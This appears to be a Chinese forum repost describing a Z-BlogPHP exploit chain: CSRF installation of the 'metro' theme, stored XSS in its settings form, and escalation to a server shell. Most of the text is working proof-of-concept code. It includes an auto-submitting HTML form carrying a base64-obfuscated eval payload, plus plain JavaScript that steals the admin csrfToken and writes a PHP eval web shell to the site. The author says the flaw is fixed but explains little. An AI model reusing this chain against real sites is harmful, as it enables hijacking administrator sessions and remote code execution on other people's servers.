##  Zblog默认Theme_csrf+储存xss+getshell

原因：
1、后台安装模版没做 csrfToken 验证。可以 csrf 安装指定 Theme
2、zblogPHP 存在一个默认 Theme 名为 metro，存在储存 xss。并且没有验证 csrfToken
3、论坛也有人写这个 getshell 的洞，通过储存 xss 直接 getshell。

测试的时候有点久了，然后在官网下载的最新版 https://www.zblogcn.com/zblogphp/ 不存在这个默认 theme
然后看了下 Github 上存在这个 Theme。

具体细节我忘记了。不做细节描述
zblog.html

```html
<!DOCTYPE html>
<html>
<head>
  <title>zblog test</title>
</head>
<body>
  <iframe src="http://zblog.test/zb_system/admin/index.php?act=ThemeMng&install=metro"></iframe>   <!-- 安装制定主题 -->
    <form action="http://zblog.test/zb_users/theme/metro/save.php" method="POST"> <!-- 触发储存xss-->
      <input type="hidden" name="layout" value="r" />
      <input type="hidden" name="hdbg5" value='120"><script>eval(atob("ZnVuY3Rpb24gZ2V0TWV0YShtZXRhTmFtZSl7Y29uc3QgbWV0YXM9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ21ldGEnKTtmb3IobGV0IGk9MDtpPG1ldGFzLmxlbmd0aDtpKyspe2lmKG1ldGFzW2ldLmdldEF0dHJpYnV0ZSgnbmFtZScpPT09bWV0YU5hbWUpe3JldHVybiBtZXRhc1tpXS5nZXRBdHRyaWJ1dGUoJ2NvbnRlbnQnKX19cmV0dXJuJyd9dmFyIGNzcmZUb2tlbj1nZXRNZXRhKCdjc3JmVG9rZW4nKTt2YXIgcGthdj17YWpheDpmdW5jdGlvbigpe3ZhciB4bWxIdHRwO3RyeXt4bWxIdHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpfWNhdGNoKGUpe3RyeXt4bWxIdHRwPW5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpfWNhdGNoKGUpe3RyeXt4bWxIdHRwPW5ldyBBY3RpdmVYT2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpfWNhdGNoKGUpe3JldHVybiBmYWxzZX19fXJldHVybiB4bWxIdHRwfSxyZXE6ZnVuY3Rpb24odXJsLGRhdGEsbWV0aG9kLGNhbGxiYWNrKXttZXRob2Q9KG1ldGhvZHx8IiIpLnRvVXBwZXJDYXNlKCk7bWV0aG9kPW1ldGhvZHx8IkdFVCI7ZGF0YT1kYXRhfHwiIjtpZih1cmwpe3ZhciBhPXRoaXMuYWpheCgpO2Eub3BlbihtZXRob2QsdXJsLHRydWUpO2lmKG1ldGhvZD09IlBPU1QiKXthLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpfWEub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7aWYoYS5yZWFkeVN0YXRlPT00JiZhLnN0YXR1cz09MjAwKXtpZihjYWxsYmFjayl7Y2FsbGJhY2soYS5yZXNwb25zZVRleHQpfX19O2lmKCh0eXBlb2YgZGF0YSk9PSJvYmplY3QiKXt2YXIgYXJyPVtdO2Zvcih2YXIgaSBpbiBkYXRhKXthcnIucHVzaChpKyI9IitlbmNvZGVVUklDb21wb25lbnQoZGF0YVtpXSkpfWEuc2VuZChhcnIuam9pbigiJiIpKX1lbHNle2Euc2VuZChkYXRhfHxudWxsKX19fSxnZXQ6ZnVuY3Rpb24odXJsLGNhbGxiYWNrKXt0aGlzLnJlcSh1cmwsIiIsIkdFVCIsY2FsbGJhY2spfSxwb3N0OmZ1bmN0aW9uKHVybCxkYXRhLGNhbGxiYWNrKXt0aGlzLnJlcSh1cmwsZGF0YSwiUE9TVCIsY2FsbGJhY2spfX07cGthdi5wb3N0KCJodHRwOi8vemJsb2cudGVzdC96Yl9zeXN0ZW0vY21kLnBocD9hY3Q9TW9kdWxlUHN0JmNzcmZUb2tlbj0iK2NzcmZUb2tlbiwiSUQ9MTUmU291cmNlPXRoZW1lJk5hbWU9dGhlbWUmSXNIaWRlVGl0bGU9JkZpbGVOYW1lPXNoZWxsJkh0bWxJRD0xMSZUeXBlPWRpdiZNYXhMaT0wJkNvbnRlbnQ9JTNDJTNGcGhwK2V2YWwoJF9QT1NUWzFdKTslM0IlM0YlM0UmTm9SZWZyZXNoPSIsZnVuY3Rpb24ocnMpe30pO3dpbmRvdy5fX3g9MTt2YXIgaWZyPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2lmci5zcmM9Imh0dHA6Ly96YmxvZy50ZXN0L3piX3VzZXJzL3RoZW1lL21ldHJvL2VkaXRvci5waHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyKQ=="))</script><ba%20"' />
      <input type="hidden" name="hdbg1" value="http://zblog.test/zb_users/theme/metro/style/images/headbg.jpg" />
      <input type="hidden" name="hdbg2[]" value="repeat" />
      <input type="hidden" name="hdbg2[]" value="fixed" />
      <input type="hidden" name="hdbg3" value="1" />
      <input type="hidden" name="hdbg4" value="top" />
      <input type="hidden" name="bodybg0" value="#EEEEEE" />
      <input type="hidden" name="bodybg1" value="http://zblog.test/zb_users/theme/metro/style/images/bg.jpg" />
      <input type="hidden" name="bodybg2[]" value="repeat" />
      <input type="hidden" name="bodybg3" value="2" />
      <input type="hidden" name="bodybg4" value="top" />
      <input type="hidden" name="color[]" value="#5EAAE4" />
      <input type="hidden" name="color[]" value=" #A3D0F2" />
      <input type="hidden" name="color[]" value=" #222222" />
      <input type="hidden" name="color[]" value=" #333333" />
      <input type="hidden" name="color[]" value=" #FFFFFF" />
      <input type="hidden" name="ok" value="�¿�­˜�…�½®" />
      <input type="submit" value="Submit request" />
    </form>
    <div></div>
    
  <script type="text/javascript">
    function ok(){
      var a = document.getElementById('test_form').submit();
      console.log (a);
    }
  </script>

</body>
</html>
```

zblog.js //getshell

```javascript
function getMeta(metaName) {
  const metas = document.getElementsByTagName('meta');
  for (let i = 0; i < metas.length; i++) {
    if (metas[i].getAttribute('name') === metaName) {
      return metas[i].getAttribute('content');
    }
  }
  return '';
}
var csrfToken = getMeta('csrfToken');

var pkav={
 ajax:function(){
    var xmlHttp;
    try{
      xmlHttp=new XMLHttpRequest();
   }catch (e){
     try{
        xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
      }catch (e){
       try{
          xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
       }
       catch (e){
          return false;
       }
     }
   }
   return xmlHttp;
 },
  req:function(url,data,method,callback){
   method=(method||"").toUpperCase();
    method=method||"GET";
   data=data||"";
    if(url){
      var a=this.ajax();
      a.open(method,url,true);
      if(method=="POST"){
       a.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     }
     a.onreadystatechange=function(){
        if (a.readyState==4 && a.status==200)
       {
         if(callback){
           callback(a.responseText);
         }
       }
     };
      if((typeof data)=="object"){
        var arr=[];
       for(var i in data){
         arr.push(i+"="+encodeURIComponent(data[i]));
        }
       a.send(arr.join("&"));
      }else{
        a.send(data||null);
     }
   }
 },
  get:function(url,callback){
   this.req(url,"","GET",callback);
  },
  post:function(url,data,callback){
   this.req(url,data,"POST",callback);
 }
};

pkav.post("http://zblog.test/zb_system/cmd.php?act=ModulePst&csrfToken="+csrfToken,"ID=15&Source=theme&Name=theme&IsHideTitle=&FileName=shell&HtmlID=11&Type=div&MaxLi=0&Content=%3C%3Fphp+eval($_POST[1]);%3B%3F%3E&NoRefresh=",function(rs){});
```

备注：新版默认已经没有这个xss主题了，已经修复了！

⚠️原文来自吐司，欢迎大家踊跃投稿吐司！https://www.t00ls.net/articles-57673.html 

